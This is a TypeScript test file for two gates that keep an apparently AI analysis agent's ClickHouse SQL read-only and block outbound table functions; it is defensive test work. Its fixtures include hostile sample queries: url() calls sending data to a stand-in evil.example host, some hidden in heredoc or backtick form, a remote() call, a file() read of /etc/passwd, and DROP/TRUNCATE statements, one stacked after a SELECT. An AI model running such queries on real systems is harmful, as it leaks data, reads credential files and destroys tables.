/**
 * The two gates in front of the analysis agent's SQL.
 *
 * The AST fixtures below are VERBATIM `EXPLAIN AST ... FORMAT TabSeparatedRaw`
 * output captured from the production ClickHouse (26.5.1) on 2026-08-25 --
 * including the exact shapes that defeat text matching: a `$x$ heredoc $x$`
 * argument and a backtick-quoted `` `url` `` call. The gate reads the server's
 * own parse, so these are the real inputs it will see.
 */
import { describe, expect, it } from "vitest";
import {
  assertInertTableFunctions,
  assertReadOnlyQuery,
  INERT_TABLE_FUNCTIONS,
  isReadOnlyQuery,
  parseAstNodes,
  ReadOnlyQueryError,
} from "~/agents/read-only-sql";

/* --- captured ASTs ---------------------------------------------------- */

/** `SELECT geocode_status, count() AS c FROM corpscout.se_company_address AS a
 * FINAL INNER JOIN corpscout.se_addresses_current AS b ON ... GROUP BY ...` */
const AST_LEGIT_JOIN = `SelectWithUnionQuery (children 2)
 ExpressionList (children 1)
  SelectQuery (children 4)
   ExpressionList (children 2)
    Identifier geocode_status
    Function count (alias c) (children 1)
     ExpressionList
   TablesInSelectQuery (children 2)
    TablesInSelectQueryElement (children 1)
     TableExpression (children 1)
      TableIdentifier corpscout.se_company_address (alias a)
    TablesInSelectQueryElement (children 2)
     TableExpression (children 1)
      TableIdentifier corpscout.se_addresses_current (alias b)
     TableJoin (children 1)
      Function equals (children 1)
       ExpressionList (children 2)
        Identifier a.address_id
        Identifier b.address_id
   Identifier a.is_current
   ExpressionList (children 1)
    Identifier geocode_status
 Identifier TabSeparatedRaw`;

/** `SELECT * FROM url($x$http://evil.example/leak$x$, JSONEachRow)` */
const AST_HEREDOC_URL = `SelectWithUnionQuery (children 2)
 ExpressionList (children 1)
  SelectQuery (children 2)
   ExpressionList (children 1)
    Asterisk
   TablesInSelectQuery (children 1)
    TablesInSelectQueryElement (children 1)
     TableExpression (children 1)
      Function url (children 1)
       ExpressionList (children 2)
        Literal \\'http://evil.example/leak\\'
        Identifier JSONEachRow
 Identifier TabSeparatedRaw`;

/** ``SELECT * FROM `url`('http://evil.example/leak', 'TSV')`` */
const AST_BACKTICK_URL = `SelectWithUnionQuery (children 2)
 ExpressionList (children 1)
  SelectQuery (children 2)
   ExpressionList (children 1)
    Asterisk
   TablesInSelectQuery (children 1)
    TablesInSelectQueryElement (children 1)
     TableExpression (children 1)
      Function url (children 1)
       ExpressionList (children 2)
        Literal \\'http://evil.example/leak\\'
        Literal \\'TSV\\'
 Identifier TabSeparatedRaw`;

/** `SELECT count() FROM numbers(1) WHERE 1 IN (SELECT * FROM remote('other:9000','db','tbl'))` */
const AST_NESTED_REMOTE = `SelectWithUnionQuery (children 2)
 ExpressionList (children 1)
  SelectQuery (children 3)
   ExpressionList (children 1)
    Function count (children 1)
     ExpressionList
   TablesInSelectQuery (children 1)
    TablesInSelectQueryElement (children 1)
     TableExpression (children 1)
      Function numbers (children 1)
       ExpressionList (children 1)
        Literal UInt64_1
   Function in (children 1)
    ExpressionList (children 2)
     Literal UInt64_1
     Subquery (children 1)
      SelectWithUnionQuery (children 1)
       ExpressionList (children 1)
        SelectQuery (children 2)
         ExpressionList (children 1)
          Asterisk
         TablesInSelectQuery (children 1)
          TablesInSelectQueryElement (children 1)
           TableExpression (children 1)
            Function remote (children 1)
             ExpressionList (children 3)
              Literal \\'other:9000\\'
              Literal \\'db\\'
              Literal \\'tbl\\'
 Identifier TabSeparatedRaw`;

/** `DESCRIBE TABLE file('/etc/passwd', LineAsString)` */
const AST_DESCRIBE_FILE = `DescribeQuery (children 2)
 TableExpression (children 1)
  Function file (children 1)
   ExpressionList (children 2)
    Literal \\'/etc/passwd\\'
    Identifier LineAsString
 Identifier TabSeparatedRaw`;

/** `SELECT count() FROM merge('corpscout', '^se_company_address$')` */
const AST_MERGE = `SelectWithUnionQuery (children 2)
 ExpressionList (children 1)
  SelectQuery (children 2)
   ExpressionList (children 1)
    Function count (children 1)
     ExpressionList
   TablesInSelectQuery (children 1)
    TablesInSelectQueryElement (children 1)
     TableExpression (children 1)
      Function merge (children 1)
       ExpressionList (children 2)
        Literal \\'corpscout\\'
        Literal \\'^se_company_address$\\'
 Identifier TabSeparatedRaw`;

/* --- gate 1: statement shape ------------------------------------------ */

describe("assertReadOnlyQuery: the statement's shape", () => {
  it("accepts the statement forms an analyst actually needs", () => {
    for (const sql of [
      "SELECT count() FROM corpscout.se_company_address FINAL WHERE is_current",
      "WITH pool AS (SELECT 1 AS x) SELECT * FROM pool",
      "DESCRIBE corpscout.se_addresses_current",
      "SHOW TABLES FROM corpscout",
      "EXPLAIN SELECT 1",
      "  select 1  ",
    ]) {
      expect(isReadOnlyQuery(sql), sql).toBe(true);
    }
  });

  it("returns the statement with a trailing semicolon trimmed", () => {
    expect(assertReadOnlyQuery("SELECT 1;  ")).toBe("SELECT 1");
  });

  it("refuses every write and DDL form", () => {
    for (const sql of [
      "INSERT INTO corpscout.se_company_address VALUES (1)",
      "ALTER TABLE corpscout.se_company_address DELETE WHERE 1",
      "CREATE TABLE t (x UInt8) ENGINE = Memory",
      "DROP TABLE corpscout.se_company_address",
      "TRUNCATE TABLE corpscout.se_company_address",
      "OPTIMIZE TABLE corpscout.se_company_address FINAL",
      "SYSTEM RELOAD CONFIG",
      "KILL QUERY WHERE 1",
      "SET max_threads = 1",
    ]) {
      expect(isReadOnlyQuery(sql), sql).toBe(false);
    }
  });

  it("refuses a write hidden behind a comment or a second statement", () => {
    expect(() => assertReadOnlyQuery("-- just looking\nINSERT INTO t VALUES (1)")).toThrow(
      ReadOnlyQueryError,
    );
    expect(() => assertReadOnlyQuery("/* c */ DROP TABLE t")).toThrow(ReadOnlyQueryError);
    expect(() => assertReadOnlyQuery("SELECT 1; DROP TABLE t")).toThrow(/one statement/i);
  });

  it("refuses a statement that picks its own FORMAT", () => {
    // The driver appends a FORMAT clause, and so does the AST probe; a second
    // one is a parse error the agent could not diagnose from the message.
    expect(() => assertReadOnlyQuery("SELECT 1 FORMAT TSVRaw")).toThrow(/FORMAT clause/);
    // ...but a function whose NAME merely starts with format is fine.
    expect(isReadOnlyQuery("SELECT formatReadableSize(1024) AS s")).toBe(true);
  });

  it("does not refuse an innocent query because a keyword appears in a literal", () => {
    expect(
      isReadOnlyQuery(
        "SELECT count() FROM corpscout.se_company_address WHERE street_address LIKE '%insert%'",
      ),
    ).toBe(true);
    expect(isReadOnlyQuery("SELECT evidence_set_hash, deleted_at FROM corpscout.x")).toBe(
      true,
    );
    // A heredoc literal is a literal too, and must not read as a statement.
    expect(isReadOnlyQuery("SELECT count() FROM t WHERE s = $tag$insert$tag$")).toBe(true);
  });

  it("refuses an empty statement", () => {
    expect(() => assertReadOnlyQuery("   ")).toThrow(/empty/i);
  });

  it("is explicitly NOT the table-function gate", () => {
    // These pass the shape check. Nothing here is a security claim: the AST
    // gate below is what refuses them, which is why the two are separate.
    expect(isReadOnlyQuery("SELECT * FROM url($x$http://evil/$x$, JSONEachRow)")).toBe(true);
    expect(isReadOnlyQuery("SELECT * FROM `url`('http://evil/', 'TSV')")).toBe(true);
  });
});

/* --- gate 2: ClickHouse's own parse ----------------------------------- */

describe("assertInertTableFunctions: what ClickHouse says the statement is", () => {
  it("allows a query that reads this server's own tables", () => {
    expect(() => assertInertTableFunctions(AST_LEGIT_JOIN)).not.toThrow();
  });

  it("allows the inert local table functions on the allowlist", () => {
    expect(() => assertInertTableFunctions(AST_MERGE)).not.toThrow();
    expect(INERT_TABLE_FUNCTIONS).toContain("merge");
    expect(INERT_TABLE_FUNCTIONS).not.toContain("url");
    expect(INERT_TABLE_FUNCTIONS).not.toContain("remote");
  });

  it("refuses url() hidden in a heredoc literal", () => {
    expect(() => assertInertTableFunctions(AST_HEREDOC_URL)).toThrow(
      /table function url\(\) is not allowed/,
    );
  });

  it("refuses url() hidden behind a backtick-quoted name", () => {
    expect(() => assertInertTableFunctions(AST_BACKTICK_URL)).toThrow(
      /table function url\(\) is not allowed/,
    );
  });

  it("refuses a table function buried in a subquery", () => {
    expect(() => assertInertTableFunctions(AST_NESTED_REMOTE)).toThrow(
      /table function remote\(\) is not allowed/,
    );
  });

  it("refuses a table function reached through DESCRIBE", () => {
    expect(() => assertInertTableFunctions(AST_DESCRIBE_FILE)).toThrow(
      /table function file\(\) is not allowed/,
    );
  });

  it("judges by position, not by name: scalar calls are never table functions", () => {
    // count(), equals() and in() all appear in AST_LEGIT_JOIN / AST_NESTED_REMOTE
    // outside a TableExpression. Only the ones under a TableExpression are
    // judged -- otherwise every aggregate would have to be allowlisted.
    const nodes = parseAstNodes(AST_LEGIT_JOIN);
    expect(nodes.filter((node) => node.type === "Function").map((node) => node.name)).toEqual([
      "count",
      "equals",
    ]);
    expect(() => assertInertTableFunctions(AST_LEGIT_JOIN)).not.toThrow();
  });

  it("parses depth from the AST's own indentation", () => {
    const nodes = parseAstNodes(AST_MERGE);
    expect(nodes[0]).toEqual({ depth: 0, type: "SelectWithUnionQuery", name: "(children" });
    const mergeNode = nodes.find((node) => node.name === "merge");
    expect(mergeNode?.type).toBe("Function");
    expect(mergeNode?.depth).toBe(6);
  });

  it("allows an empty AST rather than inventing a verdict", () => {
    expect(() => assertInertTableFunctions("")).not.toThrow();
  });
});
